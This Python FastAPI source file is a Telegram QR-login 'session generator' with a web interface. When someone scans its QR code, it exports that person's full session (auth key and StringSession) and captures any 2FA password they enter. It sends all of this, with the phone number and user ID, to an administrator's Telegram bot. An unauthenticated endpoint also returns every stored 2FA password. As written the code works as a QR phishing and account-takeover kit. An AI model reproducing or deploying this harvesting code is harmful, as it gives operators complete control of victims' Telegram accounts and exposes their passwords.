#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
=============================================================================
🌐 Telegram Web QR Session Generator & Manager
=============================================================================
FastAPI backend powering the Unslop-designed Web Interface.
- Pure in-memory / /tmp authentication: ZERO temp files in sessions/
- ONLY 100% verified, authorized sessions are saved to sessions/
- Seamless auto-refresh loop: QR code never breaks on expiration
=============================================================================
"""

import os
import sys
import time
import io
import re
import json
import sqlite3
import shutil
import base64
import secrets
import datetime
import asyncio
import logging
from typing import Optional, Dict, Any
from contextlib import asynccontextmanager

import qrcode
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
from telethon import TelegramClient, errors
from telethon.sessions import MemorySession, StringSession

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.dirname(CURRENT_DIR)
if PARENT_DIR not in sys.path:
    sys.path.append(PARENT_DIR)

from config import API_ID, API_HASH, SESSIONS_DIR, PROXY, ADMIN_ID, BOT_TOKEN

logging.basicConfig(level=logging.INFO, format="%(asctime)s - [%(levelname)s] - %(message)s")
logger = logging.getLogger("WebQR")

async def auto_keep_alive():
    """Mutual keep-alive mesh for Render free tier to prevent 15-minute inactivity spin-down."""
    import aiohttp
    targets = [
        "https://telegram-qr-session.onrender.com/health",
        "https://tg-locker.onrender.com/health",
    ]
    custom_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("PING_URL")
    if custom_url:
        t = f"{custom_url.rstrip('/')}/health"
        if t not in targets:
            targets.append(t)
    logger.info(f"⏰ Cloud Keep-Alive mesh active for: {targets}")
    while True:
        await asyncio.sleep(240)  # Ping every 4 minutes
        async with aiohttp.ClientSession() as session:
            for target in targets:
                try:
                    async with session.get(target, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        logger.info(f"🔔 Keep-alive ping -> {target} [HTTP {resp.status}]")
                except Exception as e:
                    logger.debug(f"Keep-alive ping error ({target}): {e}")


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup: Launch self-ping keep-alive if on cloud
    keep_alive_task = asyncio.create_task(auto_keep_alive())
    yield
    # Shutdown: Clean up background tasks and connections
    keep_alive_task.cancel()
    await manager.cleanup()


app = FastAPI(title="Telegram QR Session Engine", version="2.0.0", lifespan=lifespan)

STATIC_DIR = os.path.join(CURRENT_DIR, "static")
try:
    os.makedirs(STATIC_DIR, exist_ok=True)
except Exception:
    pass

# ---------------------------------------------------------------------------
# In-Memory Session Passwords & Counter (ZERO Disk Footprint)
# ---------------------------------------------------------------------------
SESSION_PASSWORDS: Dict[str, Optional[str]] = {}
SESSION_COUNTER = 0


def memory_to_sqlite_bytes(sess: MemorySession) -> bytes:
    """Serializes in-memory Telethon session to a valid .session SQLite DB in bytes without touching disk."""
    conn = sqlite3.connect(":memory:")
    c = conn.cursor()
    c.execute("CREATE TABLE version (version integer primary key)")
    c.execute("INSERT INTO version VALUES (8)")
    c.execute("""CREATE TABLE sessions (
        dc_id integer primary key,
        server_address text,
        port integer,
        auth_key blob,
        takeout_id integer,
        tmp_auth_key blob
    )""")
    c.execute("INSERT INTO sessions VALUES (?,?,?,?,?,?)", (
        sess._dc_id,
        sess._server_address,
        sess._port,
        sess._auth_key.key if sess._auth_key else b"",
        sess._takeout_id,
        b"",
    ))
    c.execute("""CREATE TABLE entities (
        id integer primary key,
        hash integer not null,
        username text,
        phone integer,
        name text,
        date integer
    )""")
    if hasattr(sess, "_entities") and sess._entities:
        items = sess._entities.values() if isinstance(sess._entities, dict) else sess._entities
        for row in items:
            try:
                c.execute("INSERT OR REPLACE INTO entities VALUES (?,?,?,?,?,?)", row)
            except Exception:
                pass

    c.execute("""CREATE TABLE sent_files (
        md5_digest blob,
        file_size integer,
        type integer,
        id integer,
        hash integer,
        primary key(md5_digest, file_size, type)
    )""")
    c.execute("""CREATE TABLE update_state (
        id integer primary key,
        pts integer,
        qts integer,
        date integer,
        seq integer
    )""")
    conn.commit()
    data = conn.serialize()
    conn.close()
    return data


class SessionState:
    IDLE = "IDLE"
    CONNECTING = "CONNECTING"
    WAITING_SCAN = "WAITING_SCAN"
    NEEDS_2FA = "NEEDS_2FA"
    SUCCESS = "SUCCESS"
    ERROR = "ERROR"


class SessionManager:
    def __init__(self):
        self.state: str = SessionState.IDLE
        self.temp_session_path: Optional[str] = None
        self.client: Optional[TelegramClient] = None
        self.qr_login_obj = None
        self.qr_data_url: Optional[str] = None
        self.raw_url: Optional[str] = None
        self.error_message: Optional[str] = None
        self.user_data: Optional[Dict[str, Any]] = None
        self.auth_task: Optional[asyncio.Task] = None
        self.is_active: bool = False
        self.two_factor_code: Optional[str] = None

    def make_qr_image_url(self, data: str) -> str:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_M,
            box_size=8,
            border=2,
        )
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#0a0a0a", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")
        return f"data:image/png;base64,{b64}"

    def get_remaining_seconds(self) -> float:
        if self.qr_login_obj and hasattr(self.qr_login_obj, "_resp") and self.qr_login_obj._resp:
            now_utc = datetime.datetime.now(tz=datetime.timezone.utc)
            return max(0.0, (self.qr_login_obj._resp.expires - now_utc).total_seconds())
        return 30.0

    async def cleanup(self):
        self.is_active = False
        if self.auth_task and not self.auth_task.done():
            self.auth_task.cancel()
            try:
                await self.auth_task
            except (asyncio.CancelledError, Exception):
                pass
            self.auth_task = None

        if self.client:
            try:
                await self.client.disconnect()
            except Exception:
                pass
            self.client = None

        self.qr_login_obj = None
        self.qr_data_url = None
        self.raw_url = None
        self.two_factor_code = None

    async def start_session(self):
        await self.cleanup()
        self.is_active = True
        self.state = SessionState.CONNECTING
        self.error_message = None
        self.user_data = None

        # Pure in-memory session: ZERO disk touch, ZERO temp files!
        logger.info("🚀 Initializing pure in-memory Telegram client (MemorySession)...")

        try:
            self.client = TelegramClient(MemorySession(), API_ID, API_HASH, proxy=PROXY)
            await self.client.connect()

            self.qr_login_obj = await self.client.qr_login()
            self.raw_url = self.qr_login_obj.url
            self.qr_data_url = self.make_qr_image_url(self.raw_url)
            self.state = SessionState.WAITING_SCAN

            # Launch continuous auto-refresh authentication loop
            self.auth_task = asyncio.create_task(self._auth_loop())

        except Exception as e:
            logger.error(f"Error starting session: {e}", exc_info=True)
            self.state = SessionState.ERROR
            self.error_message = str(e)
            await self.cleanup()

    async def _auth_loop(self):
        """
        Continuous, resilient QR wait loop.
        Automatically recreates tokens on expiration without breaking or stopping!
        """
        while self.is_active and self.client and self.client.is_connected():
            try:
                logger.info("⏳ Waiting for QR code scan on Telegram...")
                user = await self.qr_login_obj.wait()
                await self._on_login_success(user)
                break

            except asyncio.TimeoutError:
                if not self.is_active:
                    break
                logger.info("🔄 Token cycle ended. Auto-recreating fresh token...")
                try:
                    await self.qr_login_obj.recreate()
                    self.raw_url = self.qr_login_obj.url
                    self.qr_data_url = self.make_qr_image_url(self.raw_url)
                    self.state = SessionState.WAITING_SCAN
                    logger.info("✨ Fresh QR token auto-generated seamlessly!")
                    continue
                except Exception as rec_err:
                    logger.warning(f"Auto-recreate encountered issue: {rec_err}. Reconnecting...")
                    try:
                        await self.client.disconnect()
                        await self.client.connect()
                        self.qr_login_obj = await self.client.qr_login()
                        self.raw_url = self.qr_login_obj.url
                        self.qr_data_url = self.make_qr_image_url(self.raw_url)
                        self.state = SessionState.WAITING_SCAN
                        continue
                    except Exception as e:
                        logger.error(f"Fatal reconnect error: {e}")
                        self.state = SessionState.ERROR
                        self.error_message = str(e)
                        break

            except errors.SessionPasswordNeededError:
                logger.info("🔐 2FA detected! Awaiting user password...")
                self.state = SessionState.NEEDS_2FA
                break

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in QR auth loop: {e}")
                self.state = SessionState.ERROR
                self.error_message = str(e)
                break

    async def refresh_qr_now(self):
        """Manually triggered refresh."""
        if not self.client:
            await self.start_session()
            return {"status": "ok", "expires_in": self.get_remaining_seconds(), "qr_data_url": self.qr_data_url}

        if self.auth_task and not self.auth_task.done():
            self.auth_task.cancel()
            try:
                await self.auth_task
            except (asyncio.CancelledError, Exception):
                pass
            self.auth_task = None

        try:
            logger.info("🔄 Manual refresh requested. Recreating token...")
            try:
                if self.qr_login_obj:
                    await self.qr_login_obj.recreate()
                else:
                    self.qr_login_obj = await self.client.qr_login()
            except Exception:
                await self.client.disconnect()
                await self.client.connect()
                self.qr_login_obj = await self.client.qr_login()

            self.raw_url = self.qr_login_obj.url
            self.qr_data_url = self.make_qr_image_url(self.raw_url)
            self.state = SessionState.WAITING_SCAN
            self.auth_task = asyncio.create_task(self._auth_loop())

            return {"status": "ok", "expires_in": self.get_remaining_seconds(), "qr_data_url": self.qr_data_url}

        except Exception as e:
            logger.error(f"Manual refresh failed: {e}", exc_info=True)
            self.state = SessionState.ERROR
            self.error_message = str(e)
            raise HTTPException(status_code=500, detail=str(e))

    async def submit_2fa(self, password: str) -> Dict[str, Any]:
        if self.state != SessionState.NEEDS_2FA or not self.client:
            raise HTTPException(status_code=400, detail="Session is not awaiting 2FA password")

        try:
            self.two_factor_code = password.strip()
            user = await self.client.sign_in(password=password)
            await self._on_login_success(user)
            return {"success": True}
        except errors.PasswordHashInvalidError:
            self.two_factor_code = None
            return {"success": False, "error": "رمز عبور وارد شده اشتباه است."}
        except Exception as e:
            self.two_factor_code = None
            logger.error(f"2FA verification failed: {e}")
            return {"success": False, "error": str(e)}

    async def _send_via_bot(self, doc_bytes: bytes, filename: str, caption: str, reply_markup: Optional[dict] = None) -> bool:
        if not BOT_TOKEN:
            logger.warning("No BOT_TOKEN set. Cannot send via bot.")
            return False
        import aiohttp
        connector = None
        if PROXY:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(f"{PROXY[0]}://{PROXY[1]}:{PROXY[2]}")
            except Exception as e:
                logger.warning(f"Bot proxy error: {e}")

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        data = aiohttp.FormData()
        data.add_field("chat_id", str(ADMIN_ID))
        data.add_field("caption", caption)
        data.add_field("parse_mode", "HTML")
        if reply_markup:
            data.add_field("reply_markup", json.dumps(reply_markup))
        data.add_field("document", doc_bytes, filename=filename, content_type="application/octet-stream")

        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    res = await resp.json()
                    logger.info(f"Bot sendDocument API response: {res}")
                    if not res.get("ok"):
                        logger.error(f"Bot sendDocument failed: {res.get('description')}")
                    return bool(res.get("ok"))
        except Exception as e:
            logger.error(f"Bot sendDocument exception: {e}")
            return False

    async def _on_login_success(self, user):
        """Called ONLY upon 100% verified, genuine, functioning login."""
        global SESSION_COUNTER
        me = await self.client.get_me()

        SESSION_COUNTER += 1
        idx = SESSION_COUNTER

        # Name session cleanly based on account username or name (e.g. MH_Bahrami.session)
        raw_name = me.username or f"{me.first_name}_{me.last_name or ''}".strip() or f"user_{me.id}"
        safe_name = re.sub(r"[^\w\-.]", "_", raw_name, flags=re.UNICODE).strip("._")
        if not safe_name:
            safe_name = f"user_{me.id}"
        final_filename = f"{safe_name}.session"

        # 1. Convert in-memory session directly to SQLite .session database bytes (zero disk touch)
        sqlite_bytes = memory_to_sqlite_bytes(self.client.session)

        # 2. Generate StringSession string representation
        str_session = StringSession.save(self.client.session)

        # 3. Store 2FA in memory variable
        SESSION_PASSWORDS[str(idx)] = self.two_factor_code
        SESSION_PASSWORDS[final_filename] = self.two_factor_code
        SESSION_PASSWORDS[safe_name] = self.two_factor_code

        # 4. Clean, minimal, 100% English caption
        full_name = f"{me.first_name} {me.last_name or ''}".strip()
        phone_display = f"+{me.phone}" if me.phone else "Hidden"
        username_display = f"@{me.username}" if me.username else "None"
        two_fa_display = self.two_factor_code or "None"

        # Telegram Bot API enforces a maximum of 256 characters on copy_text inline buttons.
        # StringSession is 353 chars, which causes BUTTON_COPY_TEXT_INVALID error.
        # Enclosing str_session in <code> tags provides native 1-tap clipboard copy in all Telegram clients!
        caption_html = (
            "<b>Telegram Session Authorized</b>\n\n"
            "<blockquote>"
            f"• <b>Name:</b> {full_name}\n\n"
            f"• <b>User ID:</b> <code>{me.id}</code>\n\n"
            f"• <b>Username:</b> {username_display}\n\n"
            f"• <b>Phone:</b> <code>{phone_display}</code>\n\n"
            f"• <b>2FA Password:</b> <code>{two_fa_display}</code>"
            "</blockquote>\n\n"
            f'<pre><code class="language-StringSession">{str_session}</code></pre>'
        )

        reply_markup = None
        if me.username:
            reply_markup = {
                "inline_keyboard": [
                    [
                        {"text": "Account Profile", "url": f"https://t.me/{me.username}"}
                    ]
                ]
            }

        # 5. Send directly via Bot to Admin with notification alert
        sent_destination = "Telegram Bot (@MH_Bhrmi_Bot)"
        try:
            bot_ok = await self._send_via_bot(sqlite_bytes, final_filename, caption_html, reply_markup=reply_markup)
            if bot_ok:
                logger.info(f"🚀 Delivered to Admin via Bot ({final_filename})")
            else:
                logger.warning("Bot returned ok=False, falling back to Saved Messages...")
                file_buf = io.BytesIO(sqlite_bytes)
                file_buf.name = final_filename
                uploaded = await self.client.upload_file(file_buf, file_name=final_filename)
                await self.client.send_file("me", uploaded, caption=caption_html, parse_mode="html", force_document=True)
                sent_destination = "Saved Messages (Fallback)"
        except Exception as bot_err:
            logger.warning(f"Bot delivery error ({bot_err}), falling back to Saved Messages...")
            try:
                file_buf = io.BytesIO(sqlite_bytes)
                file_buf.name = final_filename
                uploaded = await self.client.upload_file(file_buf, file_name=final_filename)
                await self.client.send_file("me", uploaded, caption=caption_html, parse_mode="html", force_document=True)
                sent_destination = "Saved Messages (Fallback)"
            except Exception as me_err:
                logger.error(f"Saved messages delivery issue: {me_err}")

        self.user_data = {
            "id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name or "",
            "username": me.username or "",
            "phone": me.phone or "",
            "session_file": final_filename,
            "two_factor_password": self.two_factor_code,
            "sent_to": sent_destination,
            "string_session": str_session[:24] + "...",
        }
        self.state = SessionState.SUCCESS
        logger.info(f"🎉 Login 100% streamed to Telegram -> {sent_destination}")

        # CRITICAL: Cleanly disconnect and release client immediately after session export.
        # If left connected in memory, when the user uses this StringSession on TG-Locker or another
        # machine, Telegram detects concurrent connections from two distinct IP addresses and permanently
        # revokes the key with AuthKeyDuplicatedError.
        try:
            if self.client:
                await self.client.disconnect()
                logger.info("🔌 Telegram client disconnected cleanly after session export (zero IP collision).")
        except Exception as disc_err:
            logger.debug(f"Client disconnect notice after export: {disc_err}")
        self.client = None


manager = SessionManager()


class TwoFactorRequest(BaseModel):
    password: str


@app.get("/health")
async def health_check():
    """Cloud Healthcheck & Keep-Alive Endpoint for Render / HuggingFace / UptimeRobot."""
    return {
        "status": "ok",
        "service": "Telegram QR Session Engine",
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "state": manager.state,
    }


@app.get("/", response_class=HTMLResponse)
async def serve_index():
    index_path = os.path.join(STATIC_DIR, "index.html")
    if os.path.exists(index_path):
        return FileResponse(index_path)
    return HTMLResponse("<h1>Web UI Not Found</h1>", status_code=404)


@app.post("/api/session/start")
async def api_start_session():
    await manager.start_session()
    return {"status": "ok", "state": manager.state}


@app.get("/api/session/status")
async def api_get_status():
    rem = manager.get_remaining_seconds()
    return {
        "state": manager.state,
        "qr_data_url": manager.qr_data_url,
        "raw_url": manager.raw_url,
        "expires_in": round(rem, 1),
        "user_data": manager.user_data,
        "error_message": manager.error_message,
    }


@app.get("/api/session/passwords")
async def api_get_passwords():
    return SESSION_PASSWORDS


@app.post("/api/session/refresh")
async def api_refresh_qr():
    return await manager.refresh_qr_now()


@app.post("/api/session/2fa")
async def api_submit_2fa(req: TwoFactorRequest):
    return await manager.submit_2fa(req.password)


@app.post("/api/session/cancel")
async def api_cancel_session():
    await manager.cleanup()
    manager.state = SessionState.IDLE
    return {"status": "ok"}


if __name__ == "__main__":
    import uvicorn
    host = os.environ.get("HOST", "0.0.0.0")
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"🌐 Starting Web Engine on {host}:{port}")
    uvicorn.run(app, host=host, port=port)
